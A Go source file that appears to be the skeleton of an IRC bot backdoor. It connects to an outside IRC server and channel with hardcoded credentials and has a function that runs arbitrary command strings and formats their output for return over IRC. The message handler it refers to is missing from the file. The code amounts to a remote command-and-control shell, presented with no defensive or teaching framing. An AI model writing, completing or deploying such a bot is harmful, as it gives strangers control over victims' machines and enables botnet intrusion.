package main

import (
	"fmt" // debug
	"net"
	"os/exec"
	"strings"

	irc "gopkg.in/irc.v3"
)

const (
	SRVADDR string = "chat.freenode.net:6667"
	CHANNEL string = "#yyyzzzxxx"
	NICK    string = "ZZYYXX"
	PASS    string = "password"
	UNAME   string = "username"
	FNAME   string = "Full Name"
)

func main() {
	go connect(SRVADDR, irc.ClientConfig{
		Nick: NICK, Pass: PASS, User: UNAME, Name: FNAME,
		Handler: irc.HandlerFunc(handler)})

	select {} // prevent exit
}

func executeCommand(input string) string {
	cmd, params := splitParams(input)
	out, _ := exec.Command(cmd, params...).Output()

	fmt.Printf("debug executing: %v, %v\n", cmd, params)

	return strings.ReplaceAll(string(out), "\n", " \\n ")
}

func connect(srv string, cfg irc.ClientConfig) {
	conn, _ := net.Dial("tcp", srv) // retry here

	client := irc.NewClient(conn, cfg)
	_ = client.Run()
}

func splitParams(line string) (string, []string) {
	params := strings.Split(line, " ")
	return params[0], params[1:]
}
